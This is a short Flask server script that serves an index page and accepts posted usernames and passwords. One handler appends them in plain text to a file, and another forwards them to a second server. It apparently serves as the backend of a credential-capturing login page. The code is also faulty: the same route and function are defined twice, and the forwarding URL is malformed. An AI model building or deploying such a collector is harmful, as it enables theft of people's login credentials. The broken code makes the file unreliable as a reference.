from flask import Flask, request, render_template, jsonify
import requests
app = Flask(__name__)

@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    # Cambia la URL a la dirección de tu servidor local
    response = requests.post('http://<192.168.0.1>:5001/save-data', json=data)
    return response.json()



@app.route('/')
def index():
    return render_template('index.html')

@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    try:
        with open('../saved_data.txt', 'a') as file:
            file.write(f"Username: {data['username']}, Password: {data['password']}\n")
        return jsonify({"status": "success", "message": "Data saved successfully"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    from waitress import serve
    serve(app, host="0.0.0.0", port=5000)
